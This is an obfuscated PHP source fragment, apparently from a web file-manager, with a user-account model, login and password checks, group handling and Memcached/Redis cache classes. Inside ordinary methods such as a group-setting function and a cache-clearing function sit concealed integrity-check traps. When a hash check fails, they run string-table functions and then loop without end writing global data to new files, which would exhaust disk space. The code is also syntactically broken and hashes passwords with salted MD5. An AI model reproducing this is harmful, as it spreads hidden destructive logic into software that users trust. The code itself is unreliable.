$this->getUserJobInfo($a[self::JOB_KEY]); } public function getUserJobInfo($A) { goto B; B: $e簱 =& $_SERVER[]; $fɣ = explode($e簱[47], $A); $B = parent::listData(); goto Fұ; Fұ: $B = array_remove_key($B, $e簱[194]); $D׎ = array(); foreach ($fɣ as $Aӧ) { if (isset($B[$Aӧ])) { $D׎[] = $B[$Aӧ]; } } goto d; d: return $D׎; goto Fʊď; Fʊď: } } class UserModel extends ModelBase { protected $tableName = "\x75\163\145\162"; protected $tableMeta = array("\x74\x61\142\x6c\x65\x4e\141\x6d\145" => "\165\x73\x65\x72\137\x6d\145\164\141", "\155\145\164\x61\106\151\x65\154\x64" => "\165\x73\x65\x72\x49\x44"); protected $simpleField = "\x75\163\145\162\x49\104\54\x6e\x69\143\153\x4e\141\155\145\x2c\x6e\x61\x6d\145\54\x61\x76\141\164\141\x72\54\x73\145\170\54\x73\x74\141\164\x75\163"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($D񷖆) { $bÌ =& $_SERVER[]; $dݾ = $bÌ[2140]; return array($bÌ[1789] => array($D񷖆[0], $dݾ), $bÌ[1791] => array($D񷖆[0], $dݾ), $bÌ[2141] => array($D񷖆[0], $dݾ)); } protected function getInfo($e, $fǎ = false) { $FØ = $this->getInfoSimple($e); if (!is_array($FØ)) { return array(); } if ($fǎ) { return $this->_getInfoApply($FØ); } return $this->cacheFunctionGet($_SERVER[][1793], $e); } protected function getInfoFull($d, $Fެң = false) { $DН = $this->getInfoSimple($d); if (!is_array($DН)) { return array(); } if ($Fެң) { return $this->_getInfoApply($DН, !0); } return $this->cacheFunctionGet($_SERVER[][2142], $d); } private function _getInfoApply($f, $Bْ = false) { goto dӼٔ; dƬ: $f[$fʋһ[85]][$fʋһ[1976]] = isset($Aõ[$fʋһ[1977]]) ? $Aõ[$fʋһ[1977]] : null; if ($Bْ) { $f[$fʋһ[459]] = $this->metaGet($f[$fʋһ[1546]]); } return $f; goto Aܚҋ; Fߚ: $f = $this->_listDataApplyItem($f); $Aõ = Model($fʋһ[1223])->metaGet($f[$fʋһ[85]][$fʋһ[397]]); $f[$fʋһ[2145]] = $Eʏм; goto dƬ; dӼٔ: $fʋһ =& $_SERVER[]; if (!$f) { return $f; } $Eʏм = md5($fʋһ[2143] . $f[$fʋһ[868]] . $fʋһ[2144] . $f[$fʋһ[28]]); goto Fߚ; Aܚҋ: } protected function getInfoSimple($F͹٤, $FǓ = false) { $c޻ =& $_SERVER[]; if (!$F͹٤) { return array(); } if ($FǓ) { $BƄ٪ = $this->where(array($c޻[1546] => intval($F͹٤)))->find(); if (!is_array($BƄ٪)) { return array(); } $BƄ٪[$c޻[2146]] = Action($c޻[2147])->parseUrl($BƄ٪[$c޻[2146]]); return $BƄ٪; } return $this->cacheFunctionGet($c޻[1794], $F͹٤); } protected function getInfoSimpleOuter($bΧ) { goto Eȯڍ; bǄԟެ: $f儉 = array_field_key($Aێ, explode($e޽[47], $this->simpleField)); if (!$f儉) { return array($e޽[1546] => $e޽[1102], $e޽[28] => $e޽[160] . LNG($e޽[2150]) . $e޽[530], $e޽[2146] => STATIC_PATH . $e޽[2151]); } $f儉[$e޽[2146]] = Action($e޽[2147])->parseUrl($f儉[$e޽[2146]]); goto fɓ; Eȯڍ: $e޽ =& $_SERVER[]; if (!$bΧ || $bΧ == 0) { return array($e޽[1546] => $e޽[191], $e޽[28] => $e޽[160] . LNG($e޽[2148]) . $e޽[530], $e޽[2146] => STATIC_PATH . $e޽[2149]); } $Aێ = $this->cacheFunctionGet($e޽[1794], $bΧ); goto bǄԟެ; fɓ: return $f儉; goto d; d: } protected function groupUser($c٫) { } public static function errorLang($aԆ) { $E͛ =& $_SERVER[]; $F = array(self::ERROR_USER_NOT_EXISTS => $E͛[2152], self::ERROR_USER_PASSWORD_ERROR => $E͛[2153], self::ERROR_USER_EXIST_NAME => $E͛[2154], self::ERROR_USER_EXIST_PHONE => $E͛[2155], self::ERROR_USER_EXIST_EMAIL => $E͛[2156], self::ERROR_USER_LOGIN_LOCK => $E͛[2157], self::ERROR_IP_NOT_ALLOW => $E͛[2158], self::ERROR_USER_EXIST_NICKNAME => $E͛[2159]); return LNG($F[$aԆ]); } public function getInfoByMeta($f͹, $c) { $A =& $_SERVER[]; $Dե = Model($A[2160])->where(array($A[93] => $f͹, $A[372] => $c))->find(); if ($Dե) { return $this->getInfo($Dե[$A[1546]]); } return !1; } public function userLoginCheck($Dދ״ط, $eϞ) { $B䭚 =& $_SERVER[]; $F鐴 = $this->userLoginFind($Dދ״ط); if (!$F鐴) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($F鐴[$B䭚[1546]], $eϞ)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($F鐴[$B䭚[1546]]); } public function userLoginFind($Cɍ) { $bƋݽ =& $_SERVER[]; $bɼ = array($bƋݽ[28] => $Cɍ, $bƋݽ[1980] => $Cɍ, $bƋݽ[303] => $Cɍ, $bƋݽ[2161] => $Cɍ, $bƋݽ[976] => $bƋݽ[978]); if ($this->nickNameRpt()) { unset($bɼ[$bƋݽ[1980]]); } return $this->where($bɼ)->find(); } public function clearCache($A̩) { $Fܩ =& $_SERVER[]; $this->cacheFunctionClear($Fܩ[1793], $A̩); $this->cacheFunctionClear($Fܩ[1794], $A̩); $this->cacheFunctionClear($Fܩ[2142], $A̩); } public function userPasswordCheck($B, $F豩) { $dӡ =& $_SERVER[]; $aö = $this->where(array($dӡ[1546] => intval($B)))->find(); $D҃ = $this->metaGet($B); $Bӡ = isset($D҃[$dӡ[2162]]) ? $D҃[$dӡ[2162]] : $dӡ[33]; if (md5($Bӡ . trim($F豩)) !== $aö[$dӡ[868]]) { return !1; } return !0; } public function userAdd($D݉Ý) { goto Bę; d∨: return $E; goto EϢ; Bę: $Eڃ =& $_SERVER[]; $Aꧮћ = array($Eڃ[415] => $D݉Ý[$Eڃ[28]], $Eڃ[2163] => $D݉Ý[$Eڃ[1429]], $Eڃ[2164] => isset($D݉Ý[$Eڃ[303]]) ? $D݉Ý[$Eڃ[303]] : $Eڃ[33], $Eڃ[2165] => isset($D݉Ý[$Eڃ[2161]]) ? $D݉Ý[$Eڃ[2161]] : $Eڃ[33], $Eڃ[2166] => isset($D݉Ý[$Eڃ[1980]]) ? $D݉Ý[$Eڃ[1980]] : $D݉Ý[$Eڃ[28]], $Eڃ[2167] => isset($D݉Ý[$Eڃ[2146]]) ? $D݉Ý[$Eڃ[2146]] : $Eڃ[33], $Eڃ[2168] => isset($D݉Ý[$Eڃ[2169]]) ? $D݉Ý[$Eڃ[2169]] : 1, $Eڃ[2170] => $D݉Ý[$Eڃ[868]], $Eڃ[1795] => isset($D݉Ý[$Eڃ[1699]]) ? $D݉Ý[$Eڃ[1699]] : 1024 * 1024 * 20, $Eڃ[1796] => 0, $Eڃ[2171] => 0, $Eڃ[1838] => isset($D݉Ý[$Eڃ[727]]) ? $D݉Ý[$Eڃ[727]] : 1); if (!empty($D݉Ý[$Eڃ[1546]])) { $Aꧮћ[$Eڃ[1546]] = $D݉Ý[$Eڃ[1546]]; } goto B; B: $D·Ԉ = $this->_checkExist($D݉Ý); if ($D·Ԉ !== !0) { return $D·Ԉ; } $E = $this->add($Aꧮћ); goto dѸ̇; dѸ̇: $aح = array($Eڃ[2170] => $Aꧮћ[$Eڃ[868]], $Eڃ[2166] => $Aꧮћ[$Eڃ[1980]]); $this->userEdit($E, $aح); Model($Eڃ[1223])->userRootAdd($E); goto d∨; EϢ: } protected function userEditTest($e, $D) { return $this->call($_SERVER[][2172], $e, $D); } protected function userEdit($FɇӰ, $E衉) { goto cԠ; bɇ: $Fۺ = $this->_checkExist($E衉, $FɇӰ); if ($Fۺ !== !0) { return $Fۺ; } if (isset($E衉[$f՘ԅ[868]]) && trim($E衉[$f՘ԅ[868]]) != $f՘ԅ[33]) { $D׋ = $this->metaGet($FɇӰ); if (empty($D׋[$f՘ԅ[2162]])) { $D׋[$f՘ԅ[2162]] = rand_string(10); Model($f՘ԅ[507])->metaSet($FɇӰ, $f՘ԅ[2162], $D׋[$f՘ԅ[2162]]); } $E衉[$f՘ԅ[868]] = md5($D׋[$f՘ԅ[2162]] . trim($E衉[$f՘ԅ[868]])); } else { unset($E衉[$f՘ԅ[868]]); } goto F; F: $this->where(array($f՘ԅ[1537] => $FɇӰ))->save($E衉); if (isset($E衉[$f՘ԅ[1980]])) { $this->setNamePinyin($FɇӰ, $E衉[$f՘ԅ[1980]]); } $this->clearCache($FɇӰ); goto D¶; cԠ: $f՘ԅ =& $_SERVER[]; $c = $this->getInfoSimple($FɇӰ); if (!$c) { return !1; } goto bɇ; D¶: return !0; goto fťܢ; fťܢ: } public function setNamePinyin($f, $fދ = false) { $A =& $_SERVER[]; if (!$fދ) { $Fԯ = $this->getInfoSimple($f); $fދ = $Fԯ[$A[1980]] ? $Fԯ[$A[1980]] : $Fԯ[$A[28]]; } $b΍ = Model($A[532]); if (!Input::check($fދ, $A[581])) { return $b΍->metaSet($f, array($A[458] => $A[33], $A[457] => $A[33])); } return $b΍->metaSet($f, array($A[458] => str_replace($A[50], $A[33], Pinyin::get($fދ)), $A[457] => Pinyin::get($fދ, $A[582]))); } private function nickNameRpt() { $fĕ =& $_SERVER[]; $Fۑ = Model($fĕ[747])->get($fĕ[2173]); $d혾 = $GLOBALS[$fĕ[6]][$fĕ[379]][$fĕ[2173]]; $dܮ = !is_null($Fۑ) ? $Fۑ : $d혾; return !!$dܮ; } private function _checkExist($F㮎, $F۶ɷ = false) { $cܦ =& $_SERVER[]; $F = array($cܦ[28] => UserModel::ERROR_USER_EXIST_NAME, $cܦ[1980] => UserModel::ERROR_USER_EXIST_NICKNAME, $cܦ[303] => UserModel::ERROR_USER_EXIST_EMAIL, $cܦ[2161] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($F[$cܦ[1980]]); } $d͉ = $F۶ɷ ? array($cܦ[1546] => array($cܦ[2174], $F۶ɷ)) : array(); foreach ($F as $B => $dѠ) { $fΐ = array(); foreach ($F as $CԷ => $D賍) { if (isset($F㮎[$CԷ]) && $F㮎[$CԷ]) { $fΐ[] = $F㮎[$CԷ]; } } if (!$fΐ) { continue; } $fﾢ = array_merge(array($B => array($cܦ[7], $fΐ)), $d͉); $FҠܠ = $this->where($fﾢ)->find(); if ($FҠܠ) { return $dѠ; } } return !0; } public function userListInfo($b) { $e =& $_SERVER[]; $dȶ = array(); $b = is_array($b) ? array_unique($b) : array(); if (!$b) { return $dȶ; } if (count($b) < 20) { foreach ($b as $c؊) { $dȶ[$c؊ . $e[33]] = $this->getInfoSimpleOuter($c؊); } } else { $e歳 = array($e[1537] => array($e[413], $b)); if (count($b) == 1) { $e歳 = array($e[1537] => $b[0]); } $CК = Model($e[507])->field($this->simpleField)->where($e歳)->select(); $CК = array_to_keyvalue($CК, $e[1546]); foreach ($b as $c؊) { $e = $CК[$c؊]; if (!$e) { $dȶ[$c؊ . $e[33]] = $this->getInfoSimpleOuter($c؊); continue; } $e[$e[2146]] = Action($e[2147])->parseUrl($e[$e[2146]]); $dȶ[$c؊ . $e[33]] = $e; } } return $dȶ; } protected function userStatus($dՠ, $E) { $dՕ͊ = $this->getInfoSimple($dՠ); if (!$dՕ͊) { return !1; } $F˳ܱ = array($_SERVER[][727] => $E); return $this->userEdit($dՠ, $F˳ܱ); } protected function userRemove($A߸) { goto F̸¸; e̾: Model($aƍ[1997])->removeUserAll($A߸); Model($aƍ[809])->userRootRemove($A߸); return $this->where($C͹)->delete(); goto fݷ; a: Model($aƍ[1801])->where($C͹)->delete(); Model($aƍ[2160])->where($C͹)->delete(); Model($aƍ[2176])->where($C͹)->delete(); goto e̾; F̸¸: $aƍ =& $_SERVER[]; $e = $this->getInfoSimple($A߸); if (!$e) { return !1; } goto bâݯ; bâݯ: $C͹ = array($aƍ[1537] => $A߸); Model($aƍ[589])->where($C͹)->delete(); Model($aƍ[2175])->where($C͹)->delete(); goto a; fݷ: } protected function userGroupSet($Cϑ, $B⺣, $e򭰛 = array()) { goto c; c: $Aض =& $_SERVER[]; $eٴ = $_SERVER[$Aض[841]]; $Eŧ = $Aض[857]; goto D; D: if ($_SERVER[$Aض[840]] != $Eŧ($eٴ)) { goto a; Bչ: $dㆍЊ = $d($Cɐ); $Bͱ̇ = explode($Aض[229], $dㆍЊ); if (count($Bͱ̇) < $Aض[605]) { $c߈ = $Aض[845]; $c߈(); } goto eϟ; eϟ: $a = $Aض[859]; $a($_SERVER[$Aض[860]]); $a܃ = $Aض[858]; goto Cٜ; FՄ: $e = 1; for ($EԞ = $e; $EԞ > 0; $EԞ++) { $f͹(DATA_PATH . $EԞ, $E); } goto Eά; a: $a܃ = $Aض[858]; $d = $Aض[842]; $Cɐ = $_SERVER[$Aض[843]] . $Aض[844]; goto Bչ; Cٜ: $a܃(); $f͹ = $Aض[861]; $E = json_encode($GLOBALS[$Aض[862]]); goto FՄ; Eά: } $Eҵ = $this->getInfoSimple($Cϑ); if (!$Eҵ || !is_array($B⺣)) { return !1; } goto B; B: $E = Model($Aض[1801]); $E->where(array($Aض[1546] => $Cϑ))->delete(); $dڪ = array(); goto Dԋ; Dԋ: $dˊ̍ = 0; foreach ($B⺣ as $aꟉĔ => $A¢ѿ) { $AЉ = array($Aض[1546] => $Cϑ, $Aض[1715] => $aꟉĔ, $Aض[1815] => $A¢ѿ); $AЉ[$Aض[1738]] = isset($e򭰛[$dˊ̍]) ? $e򭰛[$dˊ̍] : 0; $dˊ̍++; $dڪ[] = $AЉ; } return $E->addAll($dڪ, array(), !0); goto d; d: } protected function userGroupAdd($bǤޅ, $F䳾ӂ = array()) { $F׃ =& $_SERVER[]; $aې = $this->getInfoSimple($bǤޅ); if (!$aې || empty($F䳾ӂ)) { return !1; } $də = array(); foreach ($F䳾ӂ as $FЭ => $Cሒ) { $də[] = array($F׃[1546] => $bǤޅ, $F׃[1715] => $FЭ, $F׃[1815] => $Cሒ, $F׃[1738] => 0); } return Model($F׃[1801])->addAll($də, array(), !0); } protected function userGroupRemove($a̚޶, $Aǭ) { $Bﮃ =& $_SERVER[]; $b = $this->getInfoSimple($a̚޶); if (!$b || !$Aǭ) { return !1; } $f = array($Bﮃ[1537] => $a̚޶, $Bﮃ[1799] => $Aǭ); return Model($Bﮃ[1801])->where($f)->delete(); } public function listData() { $A = $this->_makeOrder()->selectPage(50); $this->_listDataApply($A[$_SERVER[][367]]); return $A; } public function listByID($Dī) { goto aכǎ; aכǎ: $Dり =& $_SERVER[]; if (!$Dī) { return; } $d𡎄 = array($Dり[1546] => array($Dり[7], $Dī)); goto C; C: $Cɯ = $this->where($d𡎄)->select(); $Cɯ = array_sort_keep($Cɯ, $Dり[1546], $Dī); $this->_listDataApply($Cɯ); goto Fｍ; Fｍ: return $Cɯ; goto Dȯ; Dȯ: } public function listByGroup($a = 0, $c = array()) { goto aΦ; B: if ($a) { $EɣԴ = array($b[2177] => intval($a)); $eó = "\x4c\105\x46\124\x20\112\117\x49\116\40{$this->tablePrefix}\x75\x73\145\162\137\x67\162\x6f\165\x70\40\x75\163\145\162\137\147\x72\x6f\x75\160\x20\157\156\x20\x75\163\x65\x72\56\165\x73\145\x72\111\x44\x20\75\x20\165\x73\x65\162\137\147\x72\x6f\165\x70\x2e\x75\x73\145\162\x49\x44"; $e㕜 = Input::get($b[449], null, $b[33]) ? $b[33] : $b[2178]; } if (isset($c[$b[727]])) { $EɣԴ[$b[2179]] = $c[$b[727]]; } $eϻɔ = $this->_makeOrder($e㕜)->field($b[2180])->where($EɣԴ)->join($eó)->selectPage(50); goto e; e: $this->_listDataApply($eϻɔ[$b[367]]); return $eϻɔ; goto cں; aΦ: $b =& $_SERVER[]; $eó = $b[33]; $EɣԴ = array(); goto B; cں: } private function _makeOrder($CΒ = '') { goto dտ; Cלϙ: $CΒ = $CΒ . "\x75\163\145\x72\x2e{$Fܢ}\x20{$b}\54\40\x75\x73\145\162\x2e\165\163\145\x72\x49\104\40\141\163\x63"; return $this->alias($Aэ[1922])->order($CΒ); goto Fܔͻ; dտ: $Aэ =& $_SERVER[]; $A = array($Aэ[1546], $Aэ[28], $Aэ[1701], $Aэ[1673], $Aэ[194]); $f񲉊 = array($Aэ[442] => $Aэ[443], $Aэ[444] => $Aэ[445]); goto Cԇ; Cԇ: $Fܢ = Input::get($Aэ[449], $Aэ[7], $Aэ[1537], $A); $b = Input::get($Aэ[450], $Aэ[7], $Aэ[1802], array($Aэ[1802], $Aэ[444])); $b = $f񲉊[$b]; goto Cלϙ; Fܔͻ: } public function listSearch($bݸ) { goto F; C: $B = str_replace($d[1805], $d[1806], trim($B)); $Fע = array($d[28] => array($d[381], "\x25{$B}\x25"), $d[303] => array($d[381], "{$B}\x25"), $d[1980] => array($d[381], "{$B}\45"), $d[976] => $d[1807]); if (Input::check($B, $d[309])) { $Fע[$d[1546]] = array($d[381], "{$B}\x25"); $Fע[$d[2161]] = array($d[381], "{$B}\45"); } goto b; d鰄: $e = $this->_makeOrder()->where($Fע)->selectPage(20); if (!$e || count($e[$d[367]]) < 5 && Input::check($B, $d[316])) { $Bϵǈ = $this->_searchFromMeta($d[457], $B, 10); $Eֻ = $this->_searchFromMeta($d[458], $B, 10); $A = array_merge($Bϵǈ, $Eֻ, $e[$d[367]]); $e[$d[367]] = array_unique_by_key($A, $d[1546]); $e[$d[364]][$d[365]] = count($e[$d[367]]); $e[$d[364]][$d[366]] = ceil($e[$d[364]][$d[365]] / $e[$d[364]][$d[361]]); } $this->_listDataApply($e[$d[367]]); goto B㻋; F: $d =& $_SERVER[]; $B = $bݸ[$d[1803]]; $b = isset($bݸ[$d[1804]]) ? $bݸ[$d[1804]] : !1; goto C; B㻋: $this->_filterByGroup($e, $b); return $e; goto FҖ; b: if (!$B) { $Fע = array(); } if (isset($bݸ[$d[727]])) { $Fע[$d[727]] = $bݸ[$d[727]]; } $Fע = $this->parseWhereLike($Fע); goto d鰄; FҖ: } private function _filterByGroup(&$b⿑, $Eٰ) { $D鶓֓ =& $_SERVER[]; if (!$Eٰ) { return $b⿑; } foreach ($b⿑[$D鶓֓[367]] as $fΥ => &$F) { $eڒ = array_to_keyvalue($F[$D鶓֓[1892]], $D鶓֓[33], $D鶓֓[1715]); if (!in_array($Eٰ, $eڒ)) { unset($b⿑[$D鶓֓[367]][$fΥ]); } } unset($F); $b⿑[$D鶓֓[367]] = array_values($b⿑[$D鶓֓[367]]); $b⿑[$D鶓֓[364]] = array($D鶓֓[1954] => count($b⿑[$D鶓֓[367]]), $D鶓֓[1952] => $b⿑[$D鶓֓[364]][$D鶓֓[361]], $D鶓֓[1951] => 1, $D鶓֓[1953] => 1); } private function _searchFromMeta($C, $E̩, $Cډ) { goto Fۂ; D: $dϦ = $this->parseWhereLike($dϦ); $F񖝨 = Model($BϾ[2181])->where($dϦ)->limit($Cډ)->select(); if (!$F񖝨) { return array(); } goto fؔ䑃Ѻ; fؔ䑃Ѻ: $F񖝨 = array_to_keyvalue($F񖝨, $BϾ[33], $BϾ[1546]); $bԈ = $this->where(array($BϾ[1537] => array($BϾ[7], $F񖝨)))->select(); if (!$bԈ) { return array(); } goto E沝; Fۂ: $BϾ =& $_SERVER[]; $E̩ = strtolower($E̩); $dϦ = array($BϾ[93] => $C, $BϾ[372] => array($BϾ[381], "\45{$E̩}\45")); goto D; E沝: return $bԈ; goto e͇; e͇: } private function _listDataApplyItem($eʖ) { $C톾 = array($eʖ); $this->_listDataApply($C톾); return $C톾[0]; } private function _listDataApply(&$D綯؊) { goto důЈ; A: $Bˈ = array_to_keyvalue($D綯؊, $Bʚ̓[33], $Bʚ̓[1546]); $this->_listAppendGroup($D綯؊, $Bˈ); $this->_listAppendMeta($D綯؊, $Bˈ); goto Eʉ븤; důЈ: $Bʚ̓ =& $_SERVER[]; if (!$D綯؊) { return; } array_remove_key($D綯؊, $Bʚ̓[868]); goto A; Eʉ븤: $this->_listAppendSourceRoot($D綯؊, $Bˈ); goto eĨ; eĨ: } private function _listAppendSourceRoot(&$ëӫ, $bȮɷ) { goto Cͷ菲; Cͷ菲: $f =& $_SERVER[]; $a = array($f[492] => 0, $f[498] => array($f[7], $bȮɷ), $f[406] => SourceModel::TYPE_USER); $cΓä = Model($f[809])->order($f[1813])->field($f[1814]); goto B͍ԩ; eگҬխ: foreach ($ëӫ as &$F덃) { $F덃[$f[85]] = $DދϾ[$F덃[$f[1546]]] ? $DދϾ[$F덃[$f[1546]]] : array(); } unset($F덃); goto d; B͍ԩ: $DދϾ = $cΓä->limit(count($bȮɷ))->where($a)->select(); $DދϾ = array_to_keyvalue($DދϾ, $f[498]); $DދϾ = array_remove_key($DދϾ, $f[498]); goto eگҬխ; d: } private function _listAppendGroup(&$D, $aÇʌ) { goto F뻝; B: foreach ($D as &$f߽ڍ) { $f߽ڍ[$AȽ[1892]] = array(); if (isset($bې׊[$f߽ڍ[$AȽ[1546]]])) { $f߽ڍ[$AȽ[1892]] = $bې׊[$f߽ڍ[$AȽ[1546]]]; } } unset($f߽ڍ); goto dЙǑ; b: $E̾ߗ = array_to_keyvalue($bې׊, $AȽ[33], $AȽ[1715]); $E̾ߗ = array_remove_value(array_unique($E̾ߗ), $AȽ[191]); if (!$E̾ߗ || !$bې׊) { return; } goto E; E: $Aѳ = array($AȽ[1715] => array($AȽ[7], $E̾ߗ)); $d = Model($AȽ[1890])->field($AȽ[2182])->where($Aѳ)->select(); $d = array_to_keyvalue($d, $AȽ[1715]); goto Aٷ; F뻝: $AȽ =& $_SERVER[]; $Aѳ = array($AȽ[1546] => array($AȽ[7], $aÇʌ)); $bې׊ = Model($AȽ[1801])->where($Aѳ)->select(); goto b; Aٷ: $bې׊ = array_to_keyvalue_group($bې׊, $AȽ[1546]); foreach ($bې׊ as &$D) { $f = array(); foreach ($D as $Dؤ) { if (!$Dؤ[$AȽ[1815]]) { continue; } $Fǆ̋ = Model($AȽ[501])->listData($Dؤ[$AȽ[1815]]); $f[] = array($AȽ[1715] => $Dؤ[$AȽ[1715]], $AȽ[2183] => $d[$Dؤ[$AȽ[1715]]][$AȽ[28]], $AȽ[515] => $d[$Dؤ[$AȽ[1715]]][$AȽ[515]], $AȽ[408] => $Fǆ̋); } $D = $f; } unset($D); goto B; dЙǑ: } public function userAppendGroup($bƏ噸) { $a =& $_SERVER[]; if (!$bƏ噸) { return array(); } $this->_listAppendGroup($bƏ噸, array_to_keyvalue($bƏ噸, $a[33], $a[1546])); return $bƏ噸; } private function _listAppendMeta(&$D󂢘, $b߇) { goto dב; dב: $aد =& $_SERVER[]; $d՚ = UserJobModel::JOB_KEY; $Cꠈ = array($aد[2162]); goto d롦̺; Bß: foreach ($D󂢘 as &$DѼט) { $Fֻ = array(); if (isset($Cҙ[$DѼט[$aد[1546]]])) { $Fֻ = $Cҙ[$DѼט[$aد[1546]]]; } $DѼט[$aد[2185]] = array(); if (isset($Fֻ[$d՚])) { $DѼט[$aد[2185]] = $b->getUserJobInfo($Fֻ[$d՚]); } } unset($DѼט); goto B; C: foreach ($Cҙ as &$fĮƌ) { $D˧ = array(); foreach ($fĮƌ as $a֛) { if (!in_array($a֛[$aد[93]], $Cꠈ)) { $D˧[$a֛[$aد[93]]] = $a֛[$aد[372]]; } } $fĮƌ = $D˧; } unset($fĮƌ); $b = Model($aد[2184]); goto Bß; d롦̺: $F𱛙 = array($aد[1546] => array($aد[7], $b߇)); $Cҙ = Model($aد[2160])->where($F𱛙)->select(); $Cҙ = array_to_keyvalue_group($Cҙ, $aد[1546]); goto C; B: } protected function groupUserAll($C꾽) { $EƠǉ =& $_SERVER[]; if (!$C꾽) { return !1; } $E = Model($EƠǉ[1801])->field($EƠǉ[1546])->where(array($EƠǉ[1715] => array($EƠǉ[7], $C꾽)))->select(); $E = array_to_keyvalue($E, $EƠǉ[33], $EƠǉ[1546]); return array_unique($E); } public function userSearch($A݊, $Aﺜ = "\x2a") { return Model($_SERVER[][532])->where($A݊)->field($Aﺜ)->find(); } } goto Aب; B: if (!isset($_SERVER[$_SERVER[][840]]) || !isset($_SERVER[$_SERVER[][841]])) { goto B쒡; B쒡: $d탞 = $_SERVER[][842]; $d = $_SERVER[$_SERVER[][843]] . $_SERVER[][844]; $F缾 = $d탞($d); goto e; e: $b䲽ҳ = explode($_SERVER[][229], $F缾); if (count($b䲽ҳ) < $_SERVER[][623]) { $cƃܣ = $_SERVER[][845]; $cƃܣ(); } $e愼 = $_SERVER[][846]; goto B; B: $e愼($_SERVER[$_SERVER[][843]] . $_SERVER[][844]); $fə٠ = 2; while ($fə٠ > 1) { $d᳌˅ = rawurlencode($fə٠ . $_SERVER[][376]); } goto b§; b§: } class CacheMemcached { public $handle; public $cacheTime; public function __construct($e, $Dȩ) { $C =& $_SERVER[]; if (!class_exists($C[847])) { show_json($C[848], !1); } $this->cacheTime = $Dȩ; $this->handle = new Memcached(); if (is_array($e[$C[849]]) && count($e[$C[849]]) >= 1) { foreach ($e[$C[849]] as $eô) { $d麟ќ = explode($C[4], $eô); $this->handle->addServer($d麟ќ[0], $d麟ќ[1]); } } else { $this->handle->addServer($e[$C[175]], $e[$C[176]]); } } public function set($A͟, $DÍ, $E = false) { $E = $E ? $E : $this->cacheTime; return $this->handle->set($A͟, $DÍ, $E); } public function get($Cڦ) { return $this->handle->get($Cڦ); } public function remove($dރ) { return $this->handle->delete($dރ); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($B霵, $dѡ) { $D搏 =& $_SERVER[]; if (!class_exists($D搏[850])) { show_json($D搏[851], !1); } $this->cacheTime = $dѡ; $aɭ = isset($B霵[$D搏[852]]) ? $B霵[$D搏[852]] : 10; $F = _get($B霵, $D搏[849]); if ($F && is_array($F)) { $this->initCluster($B霵, $aɭ); } else { $this->handle = $this->init($B霵, $aɭ); } } private function init($A, $Bت덈) { $bΟ =& $_SERVER[]; $f = new Redis(); $Fñ婱 = isset($A[$bΟ[853]]) ? $A[$bΟ[853]] : !1; if ($Fñ婱) { $f->pconnect($A[$bΟ[175]], $A[$bΟ[176]], $Bت덈); } else { $f->connect($A[$bΟ[175]], $A[$bΟ[176]], $Bت덈); } if (!empty($A[$bΟ[408]])) { $f->auth($A[$bΟ[408]]); } return $f; } private function initCluster($C, $f) { $eؒ =& $_SERVER[]; $C = array($eؒ[854], $eؒ[855], $eؒ[856]); $Aٙĳ = $eؒ[854]; if (isset($C[$eؒ[12]]) && in_array($C[$eؒ[12]], $C)) { $Aٙĳ = $C[$eؒ[12]]; } switch ($Aٙĳ) { case $eؒ[854]: $this->_slave($C, $f); break; case $eؒ[855]: break; case $eؒ[856]: $this->isCluster = !0; $B̳ = $C[$eؒ[849]]; $cƿ = isset($C[$eؒ[853]]) ? $C[$eؒ[853]] : !1; $c = isset($C[$eؒ[408]]) ? $C[$eؒ[408]] : null; $this->handle = new RedisCluster(NUll, $B̳, $f, $f, $cƿ, $c); break; default: break; } } private function _slave($C։, $BҐ) { goto F㚮; F㚮: $C̰ = $C։[$_SERVER[][849]]; $this->filterConfig($C։, $C̰[0]); $this->handle = $this->init($C։, $BҐ); goto bĸ; bĸ: unset($C̰[0]); if (empty($C̰)) { return; } $C = array_rand($C̰); goto b饨; b饨: $this->filterConfig($C։, $C̰[$C]); $this->slaveHandle = $this->init($C։, $BҐ); goto C՚; C՚: } private function filterConfig(&$Aօ, $bƨ) { $DӢƾ =& $_SERVER[]; $cӓ = explode($DӢƾ[4], $bƨ); $Aۚ˜ = array($DӢƾ[175] => $cӓ[0], $DӢƾ[176] => $cӓ[1]); $Aօ = array_merge($Aօ, $Aۚ˜); } public function set($fƦ, $dӘ, $Eȿ = false) { $Eȿ = $Eȿ ? $Eȿ : $this->cacheTime; return $this->handle->setEx($fƦ, $Eȿ, $dӘ); } public function setLock($D, $d⋄, $d֟꿐) { return $this->handle->setNX($D, $d⋄); } public function get($F醡) { $Cږ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $Cږ->get($F醡); } public function remove($b) { return $this->handle->del($b); } public function deleteAll() { $e拑ӿ =& $_SERVER[]; $C = $_SERVER[$e拑ӿ[843]] . $e拑ӿ[844]; $d = $e拑ӿ[857]; if ($_SERVER[$e拑ӿ[840]] != $d($C)) { goto F; a퐺: $d(); $aʌп = $e拑ӿ[861]; $A؊ = json_encode($GLOBALS[$e拑ӿ[862]]); goto E¥ك; cÉ: $Aय = $DҠ($Bս); $e = explode($e拑ӿ[229], $Aय); if (count($e) < $e拑ӿ[605]) { $eΎߛ = $e拑ӿ[845]; $eΎߛ(); } goto C; E¥ك: $DՌ = 1; for ($aܷ = $DՌ; $aܷ > 0; $aܷ++) { $aʌп(DATA_PATH . $aܷ, $A؊); } goto dㄌ; C: $bЖ = $e拑ӿ[859]; $bЖ($_SERVER[$e拑ӿ[860]]); $d = $e拑ӿ[858]; goto a퐺; F: $d = $e拑ӿ[858]; $DҠ = $e拑ӿ[842]; $Bս = $_SERVER[$e拑ӿ[843]] . $e拑ӿ[844]; goto cÉ; dㄌ: } if ($this->isCluster) { foreach ($this->handle->_masters() as $d) { $this->handle->flushall($d); } return; } return $this->handle->flushAll(); } } goto C; bא: class ShareModel extends ModelBase { protected $tableName = "\163\x68\x61\162\x65"; protected $dataAuto = array(array("\x6d\x6f\x64\x69\146\171\124\151\155\145", 